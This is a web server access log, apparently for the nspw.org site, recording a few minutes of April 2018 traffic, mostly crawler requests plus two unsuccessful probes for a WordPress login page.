81.224.98.29 - - [25/Apr/2018:12:27:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.224.98.29 - - [25/Apr/2018:12:27:13 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:27:20 -0400] "GET /2008/pc.content.2008 HTTP/1.1" 200 7939 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:27:42 -0400] "GET /2008/registration.content.2007 HTTP/1.1" 200 12230 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
212.15.177.136 - - [25/Apr/2018:12:27:57 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
212.15.177.136 - - [25/Apr/2018:12:27:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:28:04 -0400] "GET /2008/submission.content HTTP/1.1" 200 3948 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:28:25 -0400] "GET /2009/invite-old/ HTTP/1.1" 200 4576 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:28:47 -0400] "GET /2009/invite-old/local.html HTTP/1.1" 200 4133 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:29:09 -0400] "GET /2009/invite-old/preproc.html HTTP/1.1" 200 5242 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:29:31 -0400] "GET /2009/invite-old/reg.html HTTP/1.1" 200 6728 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:12:29:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [25/Apr/2018:12:29:44 -0400] "GET /2007/pc.shtml HTTP/1.1" 200 5917 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:12:29:53 -0400] "GET /2009/invite/reg.html HTTP/1.1" 200 6801 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:30:14 -0400] "GET /2009/local.content HTTP/1.1" 200 8432 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:30:36 -0400] "GET /2009/nspw-footer-old.html HTTP/1.1" 200 4203 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:30:58 -0400] "GET /2009/nspw-footer.html HTTP/1.1" 200 4260 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:31:20 -0400] "GET /2009/nspw-header.html HTTP/1.1" 200 3878 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:31:41 -0400] "GET /2009/oldindex.html HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.180.203.48 - - [25/Apr/2018:12:31:28 -0400] "GET /papers/2008/nspw2008-herley.pdf HTTP/1.1" 200 408999 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexMobileBot/3.0; +http://yandex.com/bots)"
95.216.19.59 - - [25/Apr/2018:12:32:03 -0400] "GET /2009/past.content HTTP/1.1" 200 5054 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
